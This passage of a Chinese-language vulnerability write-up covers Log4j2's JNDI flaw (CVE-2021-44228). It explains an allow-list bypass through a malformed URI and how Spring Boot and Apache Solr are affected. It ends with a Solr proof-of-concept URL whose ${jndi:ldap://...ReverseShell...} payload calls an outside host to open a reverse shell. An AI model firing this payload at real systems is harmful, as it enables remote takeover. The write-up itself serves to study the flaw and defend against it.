            }
        } catch (URISyntaxException ex) {
            // This is OK.
        }
        return (T) this.context.lookup(name);
    }
```

其中 `permanentAllowedHosts` 是本地 IP，`permanentAllowedClasses` 是八大基础数据类型加 `Character`，`permanentAllowedProtocols` 包含 java/ldap/ldaps。

因此，只要在判断时触发 `URISyntaxException` 异常，例如在 URI 中插入空格，即可触发漏洞，复现如下：

虽然此处绕过了校验，但由于默认 lookup 配置为关闭，需要开启才能触发漏洞，所以危害较低。



# 影响范围和一些触发点
## springboot
默认情况下，Spring Boot 会用 Logback 来记录日志，并用 INFO 级别输出到控制台。也就是说，虽然包含了 Log4j2 的 jar 包，但是如果没有配置调用，是不会受到危害的。

但如果将日志框架修改为 Log4j2，则会受到此漏洞的影响，例如将配置文件改为如下格式：

```plain
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <exclusions>
            <exclusion>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-logging</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-log4j2</artifactId>
        <version>2.6.1</version>
    </dependency>
</dependencies>
```

## apache solr
Apache Solr 是 Apache Lucene 项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如 Word、PDF）的处理。当然也是此次漏洞的受害者。

<font style="color:rgb(92, 92, 92);">官方通告：</font>[<font style="color:rgb(255, 64, 129);">https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228</font>](https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228)

Apache Solr 的 POC 都已经传遍了世界，如下：

/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json

